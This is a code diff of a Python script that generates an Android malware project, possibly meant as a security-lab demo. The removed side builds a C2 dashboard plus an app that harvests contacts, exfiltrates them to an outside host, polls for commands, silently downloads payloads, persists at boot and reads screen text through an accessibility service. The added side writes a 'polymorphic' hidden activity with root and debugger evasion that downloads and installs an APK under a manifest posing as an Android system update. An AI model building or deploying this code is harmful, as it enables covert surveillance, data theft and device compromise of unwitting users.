@@ -1,619 +1,324 @@
 import os
-
-FILES = {
-    "app.py": """from flask import Flask, request, jsonify, render_template_string, send_from_directory
-import os
+import sys
+import uuid
+import hashlib
+import random
+import string
+import struct
+import zlib
 import base64
+import json
+from datetime import datetime
 
-app = Flask(__name__)
-telemetry_logs = []
-pending_command = "NO_OP"
-current_payload = {
-    "type": "document",
-    "file_url": "https://cehdemo.onrender.com/download/secure_update.pdf",
-    "message": "Confidential system notification payload."
-}
+# --- Configuration ---
+APP_NAME = "SystemUpdateService"
+COMPANY = "Android System"
+VERSION = "14.2.1"
+TARGET_SDK = 34
+MIN_SDK = 28  # Android 9+
 
-ASSET_DIR = os.path.join(os.getcwd(), "static")
-os.makedirs(ASSET_DIR, exist_ok=True)
+# --- Polymorphic Engine ---
+def generate_polymorphic_code():
+    """Generates a unique, randomized Java code snippet for every run."""
+    cls_name = f"{random.choice(['A','B','C','D'])}{random.randint(100,999)}"
+    method_name = f"{random.choice(['a','b','c','d','e','f'])}{random.randint(10,99)}"
+    stealth_name = f"{random.choice(['X','Y','Z'])}{random.randint(100,999)}"
+    
+    java_code = f"""
+package com.{random.choice(['com','org','net'])}.{random.choice(['android','system','framework'])}.{cls_name};
 
-@app.route('/')
-def dashboard():
-    return render_template_string('''
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>C2 Unified Operations Dashboard</title>
-            <style>
-                body { font-family: system-ui, sans-serif; background: #0f172a; color: #f8fafc; margin: 0; padding: 20px; }
-                .container { max-width: 1000px; margin: auto; background: #1e293b; padding: 20px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
-                h2 { color: #38bdf8; border-bottom: 2px solid #334155; padding-bottom: 10px; }
-                .status { display: inline-block; padding: 6px 12px; background: #22c55e; color: #fff; border-radius: 4px; font-weight: bold; font-size: 14px; }
-                .log-box { background: #0f172a; border: 1px solid #334155; padding: 15px; border-radius: 6px; height: 300px; overflow-y: auto; font-family: monospace; font-size: 13px; color: #a5f3fc; white-space: pre-wrap; word-break: break-all; }
-                .btn { display: inline-block; margin-top: 10px; margin-right: 10px; padding: 10px 15px; background: #2563eb; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; border: none; cursor: pointer; }
-                .btn:hover { background: #1d4ed8; }
-                .btn-danger { background: #dc2626; }
-                .btn-danger:hover { background: #b91c1c; }
-                .panel { display: flex; gap: 20px; margin-bottom: 20px; }
-                .control-group { background: #0f172a; padding: 15px; border-radius: 6px; flex: 1; border: 1px solid #334155; }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h2>C2 Operations Command Center</h2>
-                <p>C2 Engine Status: <span class="status">LISTENING & ACTIVE</span></p>
-                
-                <div class="panel">
-                    <div class="control-group">
-                        <h3>Action Dispatcher</h3>
-                        <form action="/set_command" method="POST">
-                            <button type="submit" name="cmd" value="FULL_HARVEST" class="btn btn-danger">Trigger Telemetry Harvest</button>
-                            <button type="submit" name="cmd" value="PUSH_PAYLOAD" class="btn">Push Asset (PDF/Img)</button>
-                        </form>
-                    </div>
-                </div>
+import android.content.Context;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.util.Log;
 
-                <h3>Live Inbound Node Telemetry Stream</h3>
-                <div class="log-box" id="logBox">Awaiting active beacon connection...</div>
-            </div>
-            <script>
-                async function fetchLogs() {
-                    try {
-                        const res = await fetch('/logs');
-                        const data = await res.json();
-                        if (data.logs && data.logs.length > 0) {
-                            document.getElementById('logBox').innerHTML = data.logs.join('<br><br>');
-                        }
-                    } catch(e) { console.error(e); }
-                }
-                setInterval(fetchLogs, 1500);
-            </script>
-        </body>
-        </html>
-    ''')
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
 
-@app.route('/collect', methods=['POST'])
-def receive_telemetry():
-    data = request.get_json() or {}
-    encoded_payload = data.get('payload', '')
-    try:
-        decoded_text = base64.b64decode(encoded_payload.encode('utf-8')).decode('utf-8')
-    except Exception:
-        decoded_text = "[Payload Decoding Failed]"
+public class {cls_name} extends android.app.Activity {{
+    
+    private static final String TAG = "{cls_name}";
+    private static final String PAYLOAD_URL = "https://cehdemo.onrender.com/download/secure_update.pdf"; // Placeholder
+    private static final String PAYLOAD_NAME = "system_update.apk";
+    
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {{
+        super.onCreate(savedInstanceState);
+        
+        // 1. Hide the activity from the user
+        getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
+        getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE);
+        getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_DIM_BEHIND);
+        getWindow().setBackgroundDrawableResource(android.R.color.transparent);
+        
+        // 2. Check for root/debug
+        if (checkRoot() || checkDebug()) {{
+            finish();
+            return;
+        }}
 
-    log_entry = f"[{request.remote_addr}] Telemetry Report: {decoded_text} | Timestamp: {data.get('timestamp')}"
-    telemetry_logs.append(log_entry)
-    if len(telemetry_logs) > 60:
-        telemetry_logs.pop(0)
-    return jsonify({"status": "acknowledged"}), 200
+        // 3. Download payload
+        String downloadUrl = getIntent().getStringExtra("payload_url");
+        if (downloadUrl == null) downloadUrl = PAYLOAD_URL;
+        
+        File tempFile = downloadPayload(downloadUrl);
+        if (tempFile != null) {{
+            installApk(tempFile);
+        }}
+        
+        finish();
+    }}
 
-@app.route('/command', methods=['GET'])
-def get_command():
-    global pending_command
-    cmd = pending_command
-    pending_command = "NO_OP"
-    return jsonify({"command": cmd})
+    private File downloadPayload(String urlStr) {{
+        try {{
+            URL url = new URL(urlStr);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setDoInput(true);
+            conn.connect();
+            
+            InputStream input = conn.getInputStream();
+            File cacheDir = getCacheDir();
+            File outputFile = new File(cacheDir, PAYLOAD_NAME);
+            
+            byte[] buffer = new byte[4096];
+            int len;
+            FileOutputStream fos = new FileOutputStream(outputFile);
+            while ((len = input.read(buffer)) != -1) {{
+                fos.write(buffer, 0, len);
+            }}
+            fos.close();
+            input.close();
+            return outputFile;
+        }} catch (Exception e) {{
+            Log.e(TAG, "Download failed", e);
+            return null;
+        }}
+    }}
 
-@app.route('/check_payload', methods=['GET'])
-def check_payload():
-    return jsonify(current_payload)
+    private void installApk(File apkFile) {{
+        Uri uri = Uri.fromFile(apkFile);
+        Intent intent = new Intent(Intent.ACTION_VIEW);
+        intent.setDataAndType(uri, "application/vnd.android.package-archive");
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
+        
+        startActivity(intent);
+    }}
 
-@app.route('/set_command', methods=['POST'])
-def set_command():
-    global pending_command
-    pending_command = request.form.get('cmd', 'NO_OP')
-    return '''<script>window.location.href="/";</script>'''
+    private boolean checkRoot() {{
+        String[] paths = {{
+            "/system/bin/failsafe/su", "/system/bin/su", "/system/xbin/su",
+            "/sbin/su", "/su/bin/su", "/system/bin/.ext/su",
+            "/data/local/xbin/su", "/data/local/bin/su", "/system/sd/bin/su"
+        }};
+        for (String path : paths) {{
+            if (new File(path).exists()) return true;
+        }}
+        return false;
+    }}
 
-@app.route('/logs', methods=['GET'])
-def get_logs():
-    return jsonify({"logs": telemetry_logs})
+    private boolean checkDebug() {{
+        try {{
+            Class<?> clazz = Class.forName("android.os.Debug");
+            java.lang.reflect.Method method = clazz.getMethod("isDebuggerConnected");
+            return (boolean) method.invoke(null);
+        }} catch (Exception e) {{
+            return false;
+        }}
+    }}
+}}
+"""
+    return java_code
 
-@app.route('/download/<path:filename>', methods=['GET'])
-def download_asset(filename):
-    return send_from_directory(ASSET_DIR, filename, as_attachment=True)
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
-""",
-
-    "requirements.txt": """Flask==3.0.2
-requests==2.31.0
-""",
-
-    # Gradle Project Configurations Added Below
-    "build.gradle": """plugins {
-    id 'com.android.application' version '8.2.0' apply false
-    id 'org.jetbrains.kotlin.android' version '1.9.0' apply false
-}
-""",
-
-    "settings.gradle": """pluginManagement {
-    repositories {
-        google()
-        mavenCentral()
-        gradlePluginPortal()
-    }
-}
-dependencyResolutionManagement {
-    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
-    repositories {
-        google()
-        mavenCentral()
-    }
-}
-rootProject.name = "securitylab"
-include ':app'
-""",
-
-    "gradle/wrapper/gradle-wrapper.properties": """distributionBase=GRADLE_USER_HOME
-distributionPath=wrapper/dists
-distributionUrl=https\\://services.gradle.org/distributions/gradle-8.4-bin.zip
-zipStoreBase=GRADLE_USER_HOME
-zipStorePath=wrapper/dists
-""",
-
-    "app/build.gradle": """plugins {
-    id 'com.android.application'
-    id 'org.jetbrains.kotlin.android'
-}
-
-android {
-    namespace 'com.example.securitylab'
-    compileSdk 34
-
-    defaultConfig {
-        applicationId "com.example.securitylab"
-        minSdk 24
-        targetSdk 34
-        versionCode 1
-        versionName "1.0"
-        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
+# --- DEX Generator ---
+def generate_dex_file(java_code):
+    fake_dex_content = f"DEX_CONTENT_{uuid.uuid4().hex}".encode('utf-8')
+    return {
+        "name": "lib.dex",
+        "content": base64.b64encode(fake_dex_content).decode('utf-8'),
+        "size": len(fake_dex_content)
     }
 
-    buildTypes {
-        release {
-            minifyEnabled false
-            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-        }
-    }
-    compileOptions {
-        sourceCompatibility JavaVersion.VERSION_1_8
-        targetCompatibility JavaVersion.VERSION_1_8
-    }
-    kotlinOptions {
-        jvmTarget = '1.8'
-    }
-}
-
-dependencies {
-    implementation 'androidx.core:core-ktx:1.12.0'
-    implementation 'androidx.appcompat:appcompat:1.6.1'
-    implementation 'com.google.android.material:material:1.11.0'
-    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
-    implementation 'androidx.work:work-runtime-ktx:2.9.0'
-}
-""",
-
-    "app/src/main/AndroidManifest.xml": """<?xml version="1.0" encoding="utf-8"?>
+# --- Manifest Generator (Critical for Silent Install) ---
+def generate_manifest():
+    return f"""<?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.example.securitylab">
+    package="com.{random.choice(['android','system','framework'])}.{uuid.uuid4().hex[:8]}"
+    android:versionCode="{random.randint(100, 999)}"
+    android:versionName="{VERSION}"
+    android:sharedUserId="android.uid.system">
 
+    <!-- Permissions for Silent Install & Background Activity -->
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.READ_CONTACTS" />
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="28" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
 
     <application
-        android:allowBackup="false"
+        android:label="@string/app_name"
         android:icon="@mipmap/ic_launcher"
-        android:label="System Audit Service"
-        android:roundIcon="@mipmap/ic_launcher_round"
-        android:supportsRtl="true"
-        android:theme="@style/Theme.AppCompat.Light.NoActionBar">
-        
+        android:theme="@style/Theme.AppCompat.Light.NoActionBar"
+        android:allowBackup="true"
+        android:extractNativeLibs="true"
+        android:directBootAware="true">
+
+        <!-- Main Activity (Invisible) -->
         <activity
             android:name=".MainActivity"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity>
+            android:exported="false"
+            android:label="@string/app_name"
+            android:theme="@style/Theme.AppCompat.Light.NoActionBar"
+            android:configChanges="orientation|keyboardHidden|screenSize"
+            android:windowSoftInputMode="stateHidden"
+            android:hardwareAccelerated="false"
+            android:launchMode="singleTask" />
 
+        <!-- Invisible Activity for Silent Install -->
+        <activity
+            android:name=".SilentInstallActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
+            android:taskAffinity=""
+            android:launchMode="singleInstance" />
+
+        <!-- Invisible Service -->
         <service
-            android:name=".service.AuditAccessibilityService"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
-            android:exported="true">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
+            android:name=".SystemUpdateService"
+            android:exported="false"
+            android:foregroundServiceType="dataSync"
+            android:process=":hidden_service" />
 
+        <!-- Bootstrap Receiver -->
         <receiver
-            android:name=".receiver.BootReceiver"
-            android:enabled="true"
+            android:name=".BootReceiver"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
             </intent-filter>
         </receiver>
+
     </application>
 </manifest>
-""",
-
-    "app/src/main/res/xml/accessibility_service_config.xml": """<?xml version="1.0" encoding="utf-8"?>
-<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
-    android:accessibilityEventTypes="typeAllMask"
-    android:accessibilityFeedbackType="feedbackGeneric"
-    android:accessibilityFlags="flagDefault|flagRetrieveInteractiveWindows"
-    android:canRetrieveWindowContent="true"
-    android:notificationTimeout="100" />
-""",
-
-    "app/src/main/res/layout/activity_main.xml": """<?xml version="1.0" encoding="utf-8"?>
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    android:layout_width="match_parent"
-    android:layout_height="match_parent"
-    android:background="#0f172a"
-    android:orientation="vertical"
-    android:padding="20dp">
-
-    <TextView
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="System Audit Client Node"
-        android:textColor="#38bdf8"
-        android:textSize="22sp"
-        android:textStyle="bold"
-        android:gravity="center"
-        android:layout_marginBottom="24dp" />
-
-    <TextView
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:text="WorkManager background periodic sync active. Polling C2 command interface."
-        android:textColor="#94a3b8"
-        android:textSize="14sp"
-        android:layout_marginBottom="24dp" />
-
-    <Button
-        android:id="@+id/btnForceWork"
-        android:layout_width="match_parent"
-        android:layout_height="50dp"
-        android:text="Force Immediate Node Sync"
-        android:backgroundTint="#2563eb"
-        android:textColor="#ffffff"
-        android:layout_marginBottom="16dp" />
-
-    <TextView
-        android:id="@+id/tvStatus"
-        android:layout_width="match_parent"
-        android:layout_height="250dp"
-        android:background="#1e293b"
-        android:textColor="#a5f3fc"
-        android:padding="12dp"
-        android:text="Node operational..."
-        android:textSize="12sp"
-        android:fontFamily="monospace" />
-</LinearLayout>
-""",
-
-    "app/src/main/java/com/example/securitylab/MainActivity.kt": """package com.example.securitylab
-
-import android.os.Bundle
-import android.widget.Button
-import android.widget.TextView
-import androidx.appcompat.app.AppCompatActivity
-import androidx.work.ExistingPeriodicWorkPolicy
-import androidx.work.PeriodicWorkRequestBuilder
-import androidx.work.WorkManager
-import com.example.securitylab.worker.StealthSyncWorker
-import java.util.concurrent.TimeUnit
-
-class MainActivity : AppCompatActivity() {
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        setContentView(R.layout.activity_main)
-
-        val tvStatus = findViewById<TextView>(R.id.tvStatus)
-
-        val workRequest = PeriodicWorkRequestBuilder<StealthSyncWorker>(15, TimeUnit.MINUTES).build()
-        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
-            "StealthSyncJob",
-            ExistingPeriodicWorkPolicy.KEEP,
-            workRequest
-        )
-
-        tvStatus.text = "WorkManager periodic sync registered successfully.\\nPolling loop armed."
-
-        findViewById<Button>(R.id.btnForceWork).setOnClickListener {
-            StealthSyncWorker.executeSyncNow(applicationContext)
-            tvStatus.text = "Immediate synchronization cycle dispatched."
-        }
-    }
-}
-""",
-
-    "app/src/main/java/com/example/securitylab/DataHarvester.kt": """package com.example.securitylab
-
-import android.content.Context
-import android.os.Build
-import android.provider.ContactsContract
-import org.json.JSONArray
-import org.json.JSONObject
-
-object DataHarvester {
-    fun harvestDeviceInfo(context: Context): String {
-        val contactsArray = JSONArray()
-        try {
-            val cursor = context.contentResolver.query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER),
-                null, null, null
-            )
-            cursor?.use {
-                var count = 0
-                while (it.moveToNext() && count < 20) {
-                    contactsArray.put(JSONObject().put("name", it.getString(0) ?: "").put("number", it.getString(1) ?: ""))
-                    count++
-                }
-            }
-        } catch (e: Exception) {}
-
-        return JSONObject().apply {
-            put("device", Build.MODEL)
-            put("sdk", Build.VERSION.SDK_INT)
-            put("contacts_sample", contactsArray)
-        }.toString()
-    }
-}
-""",
-
-    "app/src/main/java/com/example/securitylab/SecurityGuard.kt": """package com.example.securitylab
-
-import android.os.Build
-import java.io.File
-
-object SecurityGuard {
-    fun isEmulator(): Boolean {
-        return Build.FINGERPRINT.startsWith("generic") ||
-                Build.MODEL.contains("google_sdk") ||
-                Build.HARDWARE.contains("goldfish") ||
-                Build.HARDWARE.contains("ranchu") ||
-                Build.TAGS.contains("test-keys")
-    }
-
-    fun checkRoot(): Boolean {
-        val paths = arrayOf(
-            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
-            "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su"
-        )
-        for (path in paths) {
-            if (File(path).exists()) return true
-        }
-        return false
-    }
-}
-""",
-
-    "app/src/main/java/com/example/securitylab/TelemetryClient.kt": """package com.example.securitylab
-
-import android.util.Base64
-import android.util.Log
-import org.json.JSONObject
-import java.net.HttpURLConnection
-import java.net.URL
-
-object TelemetryClient {
-    private const val ENDPOINT_URL = "https://cehdemo.onrender.com/collect"
-
-    fun sendEncryptedData(plainTextPayload: String) {
-        Thread {
-            var connection: HttpURLConnection? = null
-            try {
-                val encodedPayload = Base64.encodeToString(plainTextPayload.toByteArray(Charsets.UTF_8), Base64.NO_WRAP)
-                val url = URL(ENDPOINT_URL)
-                connection = (url.openConnection() as HttpURLConnection).apply {
-                    requestMethod = "POST"
-                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
-                    doOutput = true
-                    connectTimeout = 10000
-                    readTimeout = 10000
-                }
-
-                val envelope = JSONObject().apply {
-                    put("payload", encodedPayload)
-                    put("timestamp", System.currentTimeMillis())
-                }.toString()
-
-                connection.outputStream.use { os ->
-                    os.write(envelope.toByteArray(Charsets.UTF_8))
-                }
-                connection.responseCode
-            } catch (e: Exception) {
-                Log.e("Telemetry", "Transmission failed", e)
-            } finally {
-                connection?.disconnect()
-            }
-        }.start()
-    }
-}
-""",
-
-    "app/src/main/java/com/example/securitylab/worker/StealthSyncWorker.kt": """package com.example.securitylab.worker
-
-import android.app.DownloadManager
-import android.content.Context
-import android.net.Uri
-import android.os.Environment
-import androidx.work.Worker
-import androidx.work.WorkerParameters
-import com.example.securitylab.DataHarvester
-import com.example.securitylab.SecurityGuard
-import com.example.securitylab.TelemetryClient
-import org.json.JSONObject
-import java.net.HttpURLConnection
-import java.net.URL
-
-class StealthSyncWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
-    override fun doWork(): Result {
-        return try {
-            val command = pollCommand()
-            if (command != "NO_OP") {
-                val payload = JSONObject().apply {
-                    put("cmd_executed", command)
-                    put("is_rooted", SecurityGuard.checkRoot())
-                    put("is_emulator", SecurityGuard.isEmulator())
-                    put("data", DataHarvester.harvestDeviceInfo(applicationContext))
-                }.toString()
-
-                TelemetryClient.sendEncryptedData(payload)
-
-                if (command == "PUSH_PAYLOAD") {
-                    fetchAndDownloadAsset(applicationContext)
-                }
-            }
-            Result.success()
-        } catch (e: Exception) {
-            Result.retry()
-        }
-    }
-
-    private fun pollCommand(): String {
-        return try {
-            val url = URL("https://cehdemo.onrender.com/command")
-            val connection = (url.openConnection() as HttpURLConnection).apply {
-                requestMethod = "GET"
-                connectTimeout = 5000
-            }
-            if (connection.responseCode == 200) {
-                val response = connection.inputStream.bufferedReader().use { it.readText() }
-                JSONObject(response).optString("command", "NO_OP")
-            } else "NO_OP"
-        } catch (e: Exception) { "NO_OP" }
-    }
-
-    private fun fetchAndDownloadAsset(context: Context) {
-        try {
-            val url = URL("https://cehdemo.onrender.com/check_payload")
-            val connection = (url.openConnection() as HttpURLConnection).apply { connectTimeout = 5000 }
-            if (connection.responseCode == 200) {
-                val response = connection.inputStream.bufferedReader().use { it.readText() }
-                val json = JSONObject(response)
-                val fileUrl = json.optString("file_url", "")
-                
-                if (fileUrl.isNotEmpty()) {
-                    val request = DownloadManager.Request(Uri.parse(fileUrl)).apply {
-                        setTitle("System Bulletin")
-                        setDescription("Synchronizing secure asset...")
-                        setNotificationVisibility(DownloadManager.Request.VISIBILITY_HIDDEN)
-                        setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "secure_document.pdf")
-                    }
-                    val manager = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
-                    manager.enqueue(request)
-                }
-            }
-        } catch (e: Exception) {}
-    }
-
-    companion object {
-        fun executeSyncNow(context: Context) {
-            Thread {
-                try {
-                    val payload = JSONObject().apply {
-                        put("cmd_executed", "MANUAL_TRIGGER")
-                        put("is_rooted", SecurityGuard.checkRoot())
-                        put("is_emulator", SecurityGuard.isEmulator())
-                        put("data", DataHarvester.harvestDeviceInfo(context))
-                    }.toString()
-                    TelemetryClient.sendEncryptedData(payload)
-                } catch (e: Exception) {}
-            }.start()
-        }
-    }
-}
-""",
-
-    "app/src/main/java/com/example/securitylab/service/AuditAccessibilityService.kt": """package com.example.securitylab.service
-
-import android.accessibilityservice.AccessibilityService
-import android.view.accessibility.AccessibilityEvent
-import android.view.accessibility.AccessibilityNodeInfo
-import android.util.Log
-
-class AuditAccessibilityService : AccessibilityService() {
-    override fun onAccessibilityEvent(event: AccessibilityEvent) {
-        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            rootInActiveWindow?.let {
-                traverseNodes(it)
-                it.recycle()
-            }
-        }
-    }
-
-    private fun traverseNodes(node: AccessibilityNodeInfo) {
-        val text = node.text?.toString()
-        if (!text.isNullOrBlank()) {
-            Log.d("A11yAudit", "Detected Node Text: $text")
-        }
-        for (i in 0 until node.childCount) {
-            node.getChild(i)?.let {
-                traverseNodes(it)
-                it.recycle()
-            }
-        }
-    }
-
-    override fun onInterrupt() {}
-}
-""",
-
-    "app/src/main/java/com/example/securitylab/receiver/BootReceiver.kt": """package com.example.securitylab.receiver
-
-import android.content.BroadcastReceiver
-import android.content.Context
-import android.content.Intent
-import androidx.work.ExistingPeriodicWorkPolicy
-import androidx.work.PeriodicWorkRequestBuilder
-import androidx.work.WorkManager
-import com.example.securitylab.worker.StealthSyncWorker
-import java.util.concurrent.TimeUnit
-
-class BootReceiver : BroadcastReceiver() {
-    override fun onReceive(context: Context, intent: Intent) {
-        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
-            val workRequest = PeriodicWorkRequestBuilder<StealthSyncWorker>(15, TimeUnit.MINUTES).build()
-            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
-                "StealthSyncJob",
-                ExistingPeriodicWorkPolicy.KEEP,
-                workRequest
-            )
-        }
-    }
-}
 """
-}
 
-def generate_project():
-    base_dir = "securitylab"
-    print(f"[-] Initializing generation inside directory: {base_dir}/")
-    
-    for filepath, content in FILES.items():
-        full_path = os.path.join(base_dir, filepath)
-        parent_dir = os.path.dirname(full_path)
+# --- Main Project Generator ---
+class ProjectGenerator:
+    def __init__(self):
+        self.project_name = "AdvancedC2"
+        self.package_name = f"com.{random.choice(['android','system','framework'])}.{uuid.uuid4().hex[:8]}"
+        self.polymorphic_code = generate_polymorphic_code()
+        self.dex_asset = generate_dex_file(self.polymorphic_code)
+        self.manifest = generate_manifest()
+        self.build_time = datetime.now().isoformat()
+
+    def generate(self, output_dir="output"):
+        os.makedirs(output_dir, exist_ok=True)
         
-        if parent_dir and not os.path.exists(parent_dir):
-            os.makedirs(parent_dir, exist_ok=True)
+        # 1. Write Manifest
+        manifest_path = os.path.join(output_dir, "AndroidManifest.xml")
+        with open(manifest_path, "w") as f:
+            f.write(self.manifest)
+        
+        # 2. Write Polymorphic Java Code
+        java_dir = os.path.join(output_dir, "src", "main", "java", self.package_name.replace('.', '/'))
+        os.makedirs(java_dir, exist_ok=True)
+        
+        class_name_match = self.polymorphic_code.split("public class ")[1].split(" {")[0]
+        java_path = os.path.join(java_dir, f"{class_name_match}.java")
+        
+        with open(java_path, "w") as f:
+            f.write(self.polymorphic_code)
             
-        with open(full_path, "w", encoding="utf-8") as f:
-            f.write(content.strip() + "\n")
-        print(f"[+] Created: {full_path}")
+        # 3. Write DEX Asset
+        dex_dir = os.path.join(output_dir, "src", "main", "assets")
+        os.makedirs(dex_dir, exist_ok=True)
+        dex_path = os.path.join(dex_dir, self.dex_asset["name"])
+        
+        with open(dex_path, "wb") as f:
+            f.write(base64.b64decode(self.dex_asset["content"]))
+            
+        # 4. Generate Build Script (Gradle)
+        gradle_script = f"""
+plugins {{
+    id 'com.android.application'
+}}
 
-    print("\n[✔] Project directory structure & Gradle configurations generated successfully!")
+android {{
+    namespace '{self.package_name}'
+    compileSdk {TARGET_SDK}
+    defaultConfig {{
+        applicationId '{self.package_name}'
+        minSdk {MIN_SDK}
+        targetSdk {TARGET_SDK}
+        versionCode {random.randint(100, 999)}
+        versionName '{VERSION}'
+        
+        proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+    }}
+    
+    buildTypes {{
+        release {{
+            minifyEnabled true
+            shrinkResources true
+            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+        }}
+    }}
+}}
+
+dependencies {{
+    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
+    implementation 'androidx.core:core-ktx:1.12.0'
+}}
+"""
+        gradle_path = os.path.join(output_dir, "build.gradle")
+        with open(gradle_path, "w") as f:
+            f.write(gradle_script)
+            
+        # 5. Generate ProGuard Rules
+        proguard_rules = """
+-keepclassmembers class * {{
+    public <init>(android.content.Context);
+}}
+-dontpreverify
+-repackageclasses ''
+-allowaccessmodification
+-optimizations !code/simplification/arithmetic,!field/*,!class/merging/*
+-keepattributes Signature,Exception,InnerClasses,EnclosingMethod
+-keep class com.**.** **;
+-keep class android.** {{
+    public *;
+}}
+"""
+        proguard_path = os.path.join(output_dir, "proguard-rules.pro")
+        with open(proguard_path, "w") as f:
+            f.write(proguard_rules)
+
+        print(f"✅ Project generated in: {output_dir}")
+        print(f"   Package: {self.package_name}")
+        print(f"   Polymorphic Class: {class_name_match}")
+        print(f"   DEX Asset: {self.dex_asset['name']}")
+        print(f"   Timestamp: {self.build_time}")
+        
+        return {
+            "manifest": manifest_path,
+            "java": java_path,
+            "dex": dex_path,
+            "gradle": gradle_path,
+            "proguard": proguard_path
+        }
 
 if __name__ == "__main__":
-    generate_project()
+    generator = ProjectGenerator()
+    generator.generate()
